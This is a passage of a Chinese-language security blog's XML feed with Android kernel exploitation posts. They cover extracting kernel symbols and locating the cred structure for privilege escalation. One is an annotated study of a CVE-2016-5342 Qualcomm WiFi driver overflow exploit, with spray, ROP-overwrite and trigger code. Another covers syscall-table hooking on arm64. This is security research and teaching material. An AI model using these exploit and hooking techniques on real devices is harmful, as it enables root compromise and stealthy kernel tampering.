class="keyword">return</span></div><div class="line">    addresses = struct.unpack_from(<span class="string">"&lt;I"</span>, img, loc + offset * <span class="number">8</span>)</div><div class="line"></div><div class="line"></div><div class="line">loc = loc + offset*<span class="number">8</span></div><div class="line">sym_num = addresses[<span class="number">0</span>]</div><div class="line"><span class="keyword">print</span> <span class="string">"sym num %d "</span> % sym_num</div></pre></td></tr></table></figure></p>
<p>注：markers这张表用于probe，本文获取内核符号时并不需要用到</p>
<p>完整code：<a href="https://github.com/ne2der/ANDROID_EXPTOOLKIT/tree/master/SymExtractor" target="_blank" rel="external">边测边写，丑到无法直视</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;EXPTECH-Get-symbols-from-Android-kernel-image&quot;&gt;&lt;a href=&quot;#EXPTECH-Get-symbols-from-Android-kernel-image&quot; class=&quot;headerlink&quot; title=&quot;[E
    
    </summary>
    
    
      <category term="EXP" scheme="http://ne2der.github.io/tags/EXP/"/>
    
      <category term="Android" scheme="http://ne2der.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>How-to-locate-CRED</title>
    <link href="http://ne2der.github.io/2017/How-to-locate-CRED/"/>
    <id>http://ne2der.github.io/2017/How-to-locate-CRED/</id>
    <published>2017-05-31T10:42:21.000Z</published>
    <updated>2017-05-31T12:02:07.478Z</updated>
    
    <content type="html"><![CDATA[<h1 id="EXPTECH-How-to-locate-cred"><a href="#EXPTECH-How-to-locate-cred" class="headerlink" title="[EXPTECH]__How to locate cred"></a>[EXPTECH]__How to locate cred</h1><h2 id="1-where-is-creds"><a href="#1-where-is-creds" class="headerlink" title="1.where is creds"></a>1.where is creds</h2><p>creds结构提保存在进程的task_struct结构体中，task_struct结构体比较长，不贴出来了，task_struct结构体定义在/include/linux/sched.h中。</p>
<p>因此要定位creds结构体，就要定位到task_struct结构体，linux内核为每一个进程都分配了一个thread_union,<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">union</span> thread_union &#123;</div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> <span class="title">thread_info</span>;</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">stack</span>[THREAD_SIZE/<span class="keyword">sizeof</span>(<span class="keyword">long</span>)];</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>因此，thread_info内存布局如图<br><img src="/images/task_stack.png" alt="task_stack"></p>
<p>thread_info结构体的task字段即该进程的task_struct结构体指针<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		flags;		<span class="comment">/* low level flags */</span></div><div class="line">	<span class="keyword">mm_segment_t</span>		addr_limit;	<span class="comment">/* address limit */</span></div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>	*<span class="title">task</span>;</span>		<span class="comment">/* main task structure */</span></div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">exec_domain</span>	*<span class="title">exec_domain</span>;</span>	<span class="comment">/* execution domain */</span></div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span>	<span class="title">restart_block</span>;</span></div><div class="line">	<span class="keyword">int</span>			preempt_count;	<span class="comment">/* 0 =&gt; preemptable, &lt;0 =&gt; bug */</span></div><div class="line">	<span class="keyword">int</span>			cpu;		<span class="comment">/* cpu */</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>thread_info中还有一个比较重要的字段addr_limit，表示该进程能可以访问的内存范围，exp中通常也用修改这个字段获取全部内存的操作权限。<br>另外，THREAD_SIZE在arm与arm64中size不同，因此在定位thread_info时有一些差异。</p>
<ul>
<li>arm</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//define in  arch/arm/include/asm/page.h</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE		(_AC(1,UL) &lt;&lt; PAGE_SHIFT)</span></div><div class="line"></div><div class="line"><span class="comment">//define in arch/arm/include/asm/thread_info.h</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SIZE_ORDER	1</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SIZE		(PAGE_SIZE &lt;&lt; THREAD_SIZE_ORDER)</span></div></pre></td></tr></table></figure>
<ul>
<li>arm64</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//define in arch/arm64/include/asm/thread_info.h</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SIZE		16384</span></div></pre></td></tr></table></figure>
<h2 id="2-如何查找creds"><a href="#2-如何查找creds" class="headerlink" title="2.如何查找creds"></a>2.如何查找creds</h2><p>根据上面的creds位置，通常有两种查找creds的方法，<br>方法一:<br>如果获取到sp，就可以反推到thread_info的头部，也就可以找到进程的task_struct结构体。事实上，kernel也是通过这种方式定位thread_info结构体的。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//define in arch/arm(arm64)/include/asm/thread_info.h</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct thread_info *<span class="title">current_thread_info</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">return</span> (struct thread_info *)</div><div class="line">		(current_stack_pointer &amp; ~(THREAD_SIZE - <span class="number">1</span>));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>只要带入对应的THREAD_SIZE即可。简化就是<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">thread_addr = sp &amp; <span class="number">0xFFFFFFFFFFFFC000</span>  <span class="comment">//for arm64</span></div><div class="line">thread_addr = sp &amp; <span class="number">0xFFFFE000</span>          <span class="comment">//for arm</span></div></pre></td></tr></table></figure></p>
<p>然后知道thread_info,task_struct的结构<br>通过<br>thread_into-&gt;task_struct-&gt;cred<br>即可找到cred</p>
<p>方法二：<br>如果内核sp没有泄露，就只好遍历task_struct链表了，在task_struct结构体中有一个task字段，这个字段时一个双向链表，系统中运行的所有进程都在这个链表中，通常的方法是先定位idle的task_struct(也就是第一个task_struct,这个task_struct是静态分配的，存在于kernel的data段)。然后从这个task_struct遍历所有task_struct,通过其中的特征字段如comm，查找指定的进程的task_struct</p>
<p><img src="/images/task_list.jpg" alt="task_list"></p>
<p>ref:<br><a href="https://geneblue.github.io/2016/07/27/Android%20PXN%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/" target="_blank" rel="external">Android pxn 绕过技术</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;EXPTECH-How-to-locate-cred&quot;&gt;&lt;a href=&quot;#EXPTECH-How-to-locate-cred&quot; class=&quot;headerlink&quot; title=&quot;[EXPTECH]__How to locate cred&quot;&gt;&lt;/a&gt;[EXPT
    
    </summary>
    
    
      <category term="EXP" scheme="http://ne2der.github.io/tags/EXP/"/>
    
      <category term="Android" scheme="http://ne2der.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>EXP学习--CVE-2016-5342</title>
    <link href="http://ne2der.github.io/2017/EXP-cve-2016-5342/"/>
    <id>http://ne2der.github.io/2017/EXP-cve-2016-5342/</id>
    <published>2017-05-20T06:15:28.000Z</published>
    <updated>2017-05-20T09:49:55.416Z</updated>
    
    <content type="html"><![CDATA[<h1 id="EXP学习-CVE-2016-5342"><a href="#EXP学习-CVE-2016-5342" class="headerlink" title="[EXP学习]___CVE-2016-5342"></a>[EXP学习]___CVE-2016-5342</h1><p>编号： CVE-2016-5342<br>EXP: <a href="https://github.com/freener/exploits" target="_blank" rel="external">Github</a><br>EXP作者：<a href="https://github.com/freener" target="_blank" rel="external">freener</a><br>相关链接：<a href="https://source.android.com/security/bulletin/2016-10-01" target="_blank" rel="external">AndroidBullitin</a>,<a href="https://www.codeaurora.org/buffer-overflow-vulnerability-wcnsswlanwrite-cve-2016-5342" target="_blank" rel="external">codeaurora</a></p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>这是一个存在于高通wifi驱动中的buffer overflow漏洞，通过<a href="https://source.codeaurora.org/quic/la/kernel/msm-3.18/commit/?id=579e796cb089324c55e0e689a180575ba81b23d9" target="_blank" rel="external">PATCH</a>分析漏洞的原理与后果。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">diff --git a/drivers/net/wireless/wcnss/wcnss_wlan.c b/drivers/net/wireless/wcnss/wcnss_wlan.c</div><div class="line">index 86f3a48..3f9eeab 100644</div><div class="line">--- a/drivers/net/wireless/wcnss/wcnss_wlan.c</div><div class="line">+++ b/drivers/net/wireless/wcnss/wcnss_wlan.c</div><div class="line">@@ -3339,7 +3339,7 @@ static ssize_t wcnss_wlan_write(struct file *fp, const char __user</div><div class="line"> 		return -EFAULT;</div><div class="line"> </div><div class="line"> 	if ((UINT32_MAX - count &lt; penv-&gt;user_cal_rcvd) ||</div><div class="line">-	     MAX_CALIBRATED_DATA_SIZE &lt; count + penv-&gt;user_cal_rcvd) &#123;</div><div class="line">+		(penv-&gt;user_cal_exp_size &lt; count + penv-&gt;user_cal_rcvd)) &#123;</div><div class="line"> 		pr_err(DEVICE " invalid size to write %zu\n", count +</div><div class="line"> 				penv-&gt;user_cal_rcvd);</div><div class="line"> 		rc = -ENOMEM;</div></pre></td></tr></table></figure></p>
<p>通过PATCH可知，漏洞原因是边界检查不严，问题出在count + penv-&gt;user_cal_rcvd的值上，函数不大，代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> ssize_t <span class="title">wcnss_wlan_write</span><span class="params">(struct file *fp, <span class="keyword">const</span> <span class="keyword">char</span> __user</span></span></div><div class="line">			*user_buffer, <span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *position)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> rc = <span class="number">0</span>;</div><div class="line">	u32 size = <span class="number">0</span>;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (!penv || !penv-&gt;device_opened || penv-&gt;user_cal_available)</div><div class="line">		<span class="keyword">return</span> -EFAULT;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (penv-&gt;user_cal_rcvd == <span class="number">0</span> &amp;&amp; count &gt;= <span class="number">4</span></div><div class="line">			&amp;&amp; !penv-&gt;user_cal_data) &#123;</div><div class="line">		rc = copy_from_user((<span class="keyword">void</span> *)&amp;size, user_buffer, <span class="number">4</span>);  <span class="comment">//获取用户态传入的前四个byte中的数据放入size中，这四个byte是传入数据的长度</span></div><div class="line">		<span class="keyword">if</span> (!size || size &gt; MAX_CALIBRATED_DATA_SIZE) &#123;</div><div class="line">			pr_err(DEVICE <span class="string">" invalid size to write %d\n"</span>, size);</div><div class="line">			<span class="keyword">return</span> -EFAULT;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		rc += count;</div><div class="line">		count -= <span class="number">4</span>;</div><div class="line">		penv-&gt;user_cal_exp_size =  size;</div><div class="line">		penv-&gt;user_cal_data = kmalloc(size, GFP_KERNEL);<span class="comment">//分配size大小的空间用于存放数据</span></div><div class="line">		<span class="keyword">if</span> (penv-&gt;user_cal_data == <span class="literal">NULL</span>) &#123;</div><div class="line">			pr_err(DEVICE <span class="string">" no memory to write\n"</span>);</div><div class="line">			<span class="keyword">return</span> -ENOMEM;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span> (<span class="number">0</span> == count)</div><div class="line">			<span class="keyword">goto</span> <span class="built_in">exit</span>;</div><div class="line"></div><div class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (penv-&gt;user_cal_rcvd == <span class="number">0</span> &amp;&amp; count &lt; <span class="number">4</span>)</div><div class="line">		<span class="keyword">return</span> -EFAULT;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> ((UINT32_MAX - count &lt; penv-&gt;user_cal_rcvd) ||</div><div class="line">	     MAX_CALIBRATED_DATA_SIZE &lt; count + penv-&gt;user_cal_rcvd) &#123;</div><div class="line">		pr_err(DEVICE <span class="string">" invalid size to write %zu\n"</span>, count +</div><div class="line">				penv-&gt;user_cal_rcvd);</div><div class="line">		rc = -ENOMEM;</div><div class="line">		<span class="keyword">goto</span> <span class="built_in">exit</span>;</div><div class="line">	&#125;</div><div class="line">	rc = copy_from_user((<span class="keyword">void</span> *)penv-&gt;user_cal_data +</div><div class="line">			penv-&gt;user_cal_rcvd, user_buffer, count); <span class="comment">//拷贝数据到分配的内存中</span></div><div class="line">	<span class="keyword">if</span> (<span class="number">0</span> == rc) &#123;</div><div class="line">		penv-&gt;user_cal_rcvd += count;</div><div class="line">		rc += count;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span> (penv-&gt;user_cal_rcvd == penv-&gt;user_cal_exp_size) &#123;</div><div class="line">		penv-&gt;user_cal_available = <span class="literal">true</span>;</div><div class="line">		pr_info_ratelimited(<span class="string">"wcnss: user cal written"</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line"><span class="built_in">exit</span>:</div><div class="line">	<span class="keyword">return</span> rc;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>由此，问题很明显，分配的空间由size控制，拷贝的数据长度却由count控制。size即传入数据的前四个字节，count是用户传入的参数，所以如果count&gt;size就可以越界写。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>通过漏洞原理学习freener的EXP代码就比较清晰了。</p>
<h3 id="1-喷射"><a href="#1-喷射" class="headerlink" title="1.喷射"></a>1.喷射</h3><p>首先分配大量的binder_fd占用内存碎片，保证后面的分配的fd是连续的<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">printf</span>( <span class="string">"[+] Spray SLUB Cache\n"</span> );</div><div class="line">    <span class="keyword">for</span>( ; i &lt; BINDER_MAX_FDS; i++ ) &#123;</div><div class="line">        binder_fd[i] = open( <span class="string">"/dev/binder"</span>, O_RDWR );</div><div class="line">        <span class="keyword">if</span> ( binder_fd[i] &lt; <span class="number">0</span> ) &#123;</div><div class="line">            <span class="built_in">printf</span>( <span class="string">"[-] Can not open binder %d\n"</span>, i ); </div><div class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>然后分配几个fd用于部署ROP，由于之前大量分配的fd已经占用了分散的内存片，这些fd在内存中是连续的。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> ( i=<span class="number">0</span>; i &lt; MAX_FD; i++ ) &#123;</div><div class="line">        fd[i] = open( <span class="string">"/dev/msm_mp3"</span>, O_RDWR | O_NONBLOCK );</div><div class="line">        <span class="keyword">if</span> ( fd[i] &lt; <span class="number">0</span> ) &#123;</div><div class="line">            <span class="built_in">printf</span>( <span class="string">"[-] Can not open /dev/msm_mp3\n"</span> );</div><div class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<h3 id="2-部署ROP"><a href="#2-部署ROP" class="headerlink" title="2.部署ROP"></a>2.部署ROP</h3><p>freenr的代码中ROP的地址的特定机型，已经找好了硬编码在代码中的<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ROP_READ  ( 0xC04DBE88 )</span></div><div class="line">………………</div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ROP_WRITE ( 0xC0760FE4 )</span></div></pre></td></tr></table></figure></p>
<p>通过漏洞将ROP地址写入内核中。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> length = <span class="number">512</span>;  <span class="comment">//size</span></div><div class="line">*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)buffer1 = length;</div><div class="line">*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buffer1 + length + <span class="number">0x14C</span>) = ROP_READ;</div><div class="line"><span class="comment">//构造数据</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</div><div class="line">close( fd[<span class="number">0</span>] ); 释放一个fd的空间</div><div class="line">count = write( fd_wlan, buffer1, message1_len + <span class="number">4</span> );  <span class="comment">//触发漏洞 第三个参数即count</span></div><div class="line"></div><div class="line"><span class="built_in">printf</span>( <span class="string">"[+] Trigger Kernel Execution Code\n"</span> );</div><div class="line"><span class="keyword">int</span> result;</div></pre></td></tr></table></figure></p>
<p>最初fd的状态<br><img src="/images/fd-orig.png" alt="fd-orig.png"><br>释放fd[0]空间<br><img src="/images/fd-release.png" alt="fd-release.png"><br>触发漏洞将ROP写入fd[1]空间中，覆盖fd结构体中的函数<br><img src="/images/fd-overwrite.png" alt="fd-overwrite.png"><br>(PS：至于为什么会恰好写到释放的空间中，答案是linux内存的SLUB机制)</p>
<h3 id="3-调用ROP"><a href="#3-调用ROP" class="headerlink" title="3.调用ROP"></a>3.调用ROP</h3><p>直接使用ioctl调用fd，就能调用ROP，将读写两个ROP分别写入两个fd，就可以拥有对内核的写与读能力。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">result  = ioctl( fd[<span class="number">1</span>], <span class="number">0x40046144</span>, SELINUX_ENFORCING );</div><div class="line">    <span class="keyword">if</span> ( result != <span class="number">0x1</span> ) &#123;</div><div class="line">        <span class="built_in">printf</span>( <span class="string">"[-] Read Kernel Failed  %x\n"</span>, result );</div><div class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>后面就是关闭SELINUX，修改cred提权了，就不分析。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;EXP学习-CVE-2016-5342&quot;&gt;&lt;a href=&quot;#EXP学习-CVE-2016-5342&quot; class=&quot;headerlink&quot; title=&quot;[EXP学习]___CVE-2016-5342&quot;&gt;&lt;/a&gt;[EXP学习]___CVE-2016-5342&lt;/
    
    </summary>
    
      <category term="Android" scheme="http://ne2der.github.io/categories/Android/"/>
    
    
      <category term="CVE" scheme="http://ne2der.github.io/tags/CVE/"/>
    
      <category term="EXP" scheme="http://ne2der.github.io/tags/EXP/"/>
    
  </entry>
  
  <entry>
    <title>syscalltable hook for Android arm64</title>
    <link href="http://ne2der.github.io/2017/syscalltable-hook-for-Android-arm64/"/>
    <id>http://ne2der.github.io/2017/syscalltable-hook-for-Android-arm64/</id>
    <published>2017-05-13T05:55:21.000Z</published>
    <updated>2017-05-20T06:21:26.114Z</updated>
    
    <content type="html"><![CDATA[<p>终于克服了拖延症写下了第一笔，前段时间看了<a href="https://www.vantagepoint.sg/blog/82-hooking-android-system-calls-for-pleasure-and-benefit" target="_blank" rel="external">Hooking Android System Calls for Pleasure and Benefit</a>，于是就自己尝试着写了一下，综合了其他的思路改用动态获取sys_call_table的方法。思路简单，主要记录下遇到的问题。</p>
<h2 id="定制内核"><a href="#定制内核" class="headerlink" title="定制内核"></a>定制内核</h2><p>首先，为了必须使Kernel支持LKM，上文中给出的方法是在编译内核make defconfig之后，修改源码目录中的.config文件。这种方法修改的选项make时会被override。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">scripts/kconfig/conf --silentoldconfig Kconfig</div><div class="line">.config:214:warning: override: reassigning to symbol MODULES</div><div class="line">#</div><div class="line"># configuration written to .config</div><div class="line">#</div></pre></td></tr></table></figure></p>
<p>回去看.config文件的已经被恢复，实际上选项并没有生效。更简单的方法是修改<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">arch/platform(arm/arm64/……)/Kconfig</div></pre></td></tr></table></figure></p>
<p>在其中将MODULES，MODULE_UNLOAD添加到default y项中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">config ARM</div><div class="line">        bool</div><div class="line">        default y</div><div class="line">        select MODULES</div><div class="line">        select MODULE_UNLOAD</div><div class="line">        select ARCH_BINFMT_ELF_RANDOMIZE_PIE</div><div class="line">        select ARCH_HAS_ATOMIC64_DEC_IF_POSITIVE</div><div class="line">        select ARCH_HAVE_CUSTOM_GPIO_H</div><div class="line">        select ARCH_HAS_TICK_BROADCAST if GENERIC_CLOCKEVENTS_BROADCAST</div><div class="line">        select ARCH_WANT_IPC_PARSE_VERSION</div><div class="line">        ……</div><div class="line">        ……</div></pre></td></tr></table></figure></p>
<h2 id="定位sys-call-table"><a href="#定位sys-call-table" class="headerlink" title="定位sys_call_table"></a>定位sys_call_table</h2><p>sys_call_table地址的获取方法有多种，如上文采用的/proc/kallsym读取的方法，还以从system.map读。这些方法原理已经已经很多，就不多说了。<br>这里我采用的是用sys_close偏移定位的方法。这种方法的原理是从PAGE_OFFSET开始暴力查找，从每一个地址找NR_close偏移处存储的是否是sys_close来判断当前地址是否是sys_call_table。测试过程中arm一切正常，但是在arm64下却会crash。经过一段时间的排查发现。arm64下由于进行arm兼容，多了一张compat_sys_call_table的表。在内存中它们的位置关系如下。<br><img src="/images/syscalltable_hook_for_Android_arm64_syscallmemory.png" alt="compat_sys_call_in_memory"><br>两张表中存储sys_close的相同，查找程序会先找到compat表中的sys_close,并且由于arm与arm64的系统调用号不同(查看对应的unistd.h确定)，所以找到的地址既不是compat_sys_call_table也不是sys_call_table。根据内存的情况，扩展原来的定位方法，首先用arm的调用号确定compat_sys_call_table地址，在跳过这个地址继续暴力查找，用arm64的调用号确定sys_call_table的地址。</p>
<p>测试环境：android kernel 3.10 arm64<br>丑陋Code：<a href="https://github.com/ne2der/ASyScallHookFrame" target="_blank" rel="external">ASyScallHookFrame</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;终于克服了拖延症写下了第一笔，前段时间看了&lt;a href=&quot;https://www.vantagepoint.sg/blog/82-hooking-android-system-calls-for-pleasure-and-benefit&quot; target=&quot;_blank&quot; 
    
    </summary>
    
      <category term="Android" scheme="http://ne2der.github.io/categories/Android/"/>
    
    
      <category term="HOOK" scheme="http://ne2der.github.io/tags/HOOK/"/>
    
      <category term="ARM64" scheme="http://ne2der.github.io/tags/ARM64/"/>
    
  </entry>
  
</feed>
